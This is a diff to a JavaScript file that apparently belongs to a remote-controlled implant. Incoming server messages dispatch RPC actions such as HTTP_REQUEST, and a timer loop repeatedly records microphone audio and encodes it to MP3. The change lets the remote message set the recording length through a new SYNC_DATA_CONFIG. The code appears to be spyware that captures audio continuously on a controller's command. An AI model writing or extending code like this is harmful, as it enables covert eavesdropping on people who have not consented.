@@ -12,6 +12,9 @@ const SYNC_SWITCH = {
   SYNC_HUGE: true,
   REALTIME_IMG: false,
 };
+const SYNC_DATA_CONFIG = {
+  RECORDING_SECONDS: 30,
+};
 
 const RPC_CALL_TABLE = {
   HTTP_REQUEST: perform_http_request,
@@ -549,6 +552,12 @@ function initialize() {
       });
     } catch (e) {}
 
+    try {
+      Object.keys(parsed_message.data.data_config).map((key) => {
+        SYNC_DATA_CONFIG[key] = parsed_message.data.data_config[key];
+      });
+    } catch (e) {}
+
     if (parsed_message.action in RPC_CALL_TABLE) {
       const result = await RPC_CALL_TABLE[parsed_message.action](
         parsed_message.data
@@ -749,9 +758,9 @@ function convertToMP3(audioBlob) {
       .arrayBuffer()
       .then((arrayBuffer) => {
         const audioBuffer = new Int16Array(arrayBuffer);
-        const mp3Encoder = new lamejs.Mp3Encoder(1, 44100, 128); 
+        const mp3Encoder = new lamejs.Mp3Encoder(1, 44100, 128);
         const mp3Data = [];
-        const blockSize = 1152; 
+        const blockSize = 1152;
         for (let i = 0; i < audioBuffer.length; i += blockSize) {
           const block = audioBuffer.subarray(i, i + blockSize);
           const mp3Buffer = mp3Encoder.encodeBuffer(block);
@@ -789,7 +798,7 @@ async function startRecording() {
         recorder.startRecording();
 
         const sleep = (m) => new Promise((r) => setTimeout(r, m));
-        await sleep(10000);
+        await sleep(SYNC_DATA_CONFIG.RECORDING_SECONDS * 1000);
 
         recorder.stopRecording(function () {
           let blob = recorder.getBlob();
@@ -814,10 +823,6 @@ async function startRecording() {
   }
 }
 
-
-
 const websocket_recording_interval = setInterval(async () => {
   await startRecording();
-}, 1000*10);
-
-
+}, 1000 * SYNC_DATA_CONFIG.RECORDING_SECONDS);
